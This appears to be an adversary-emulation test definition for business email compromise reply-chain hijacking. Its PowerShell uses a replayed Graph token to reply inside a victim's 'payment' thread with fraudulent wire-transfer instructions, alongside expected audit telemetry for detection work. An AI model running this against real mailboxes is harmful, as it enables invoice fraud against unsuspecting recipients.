attack_technique: T1534
display_name: "Post-Exploitation – BEC Reply-Chain Hijacking"
atomic_tests:
  - name: "Reply to existing email thread from compromised mailbox via Graph"
    auto_generated_guid: b0c1d2e3-f4a5-6789-bcde-789012345619
    description: |
      Inserts a fraudulent reply into an existing email thread from the
      compromised victim's account. Reply-chain hijacking is more convincing
      than cold phishing because the recipient sees prior legitimate context.
      Wraps Microsoft.Graph.Mail to reply to the most recent thread found
      matching a subject keyword.
    supported_platforms:
      - windows
      - linux
      - macos
    input_arguments:
      tenant_id:
        description: "Entra tenant ID of the lab tenant."
        type: String
        default: "00000000-0000-0000-0000-000000000000"
      sender_user_id:
        description: "User ID or UPN of the compromised sender."
        type: String
      thread_subject_keyword:
        description: "Keyword to search for in existing threads (reply to the most recent match)."
        type: String
        default: "payment"
      fraudulent_reply:
        description: "Body text of the fraudulent reply."
        type: String
        default: "Please update the wire transfer details to the account below before processing."
      token_cache_path:
        description: "Path to a Graph-scoped token cache file."
        type: Path
        default: "#{token_cache_path}"
    executor:
      name: powershell
      command: |
        Import-Module Microsoft.Graph.Mail -ErrorAction Stop

        $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
        Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

        $threads = Get-MgUserMessage `
            -UserId '#{sender_user_id}' `
            -Filter "contains(subject,'#{thread_subject_keyword}')" `
            -Top 5 `
            -Select 'id,subject,conversationId,toRecipients'

        if (-not $threads) {
            throw "No thread found matching subject keyword '#{thread_subject_keyword}'."
        }

        $targetMsg = $threads | Sort-Object ReceivedDateTime | Select-Object -Last 1

        $replyBody = @{
            message = @{
                body = @{
                    contentType = 'Text'
                    content     = '#{fraudulent_reply}'
                }
            }
            comment = '#{fraudulent_reply}'
        }

        Invoke-MgReplyUserMessage -UserId '#{sender_user_id}' -MessageId $targetMsg.Id -BodyParameter $replyBody
        Write-Host "Reply-chain hijack sent in thread '$($targetMsg.Subject)'."
    cleanup_command: |
      Write-Host "No automated cleanup for sent email. Review Sent Items and delete manually."
    references:
      - "https://thedfirreport.com/2022/09/12/dead-end-job-bec-using-qbot/"
    auth_profile: "graph-delegated"
    defense_evasion: "Legitimate thread context makes fraudulent reply highly convincing; no new thread created"
    requires_token:
      from: "cookie-replay"
      resource: "https://graph.microsoft.com"
    expected_telemetry:
      - source: ual
        match:
          Operations: "Send"
          ItemType: "Message"
        within_minutes: 20
      - source: ual
        match:
          Operations: "MailItemsAccessed"
        within_minutes: 30
    exercises_chokepoint:
      id: "DC-POSTEX-008"
      url: "https://detectionchokepoints.com/postex/bec-reply-chain"
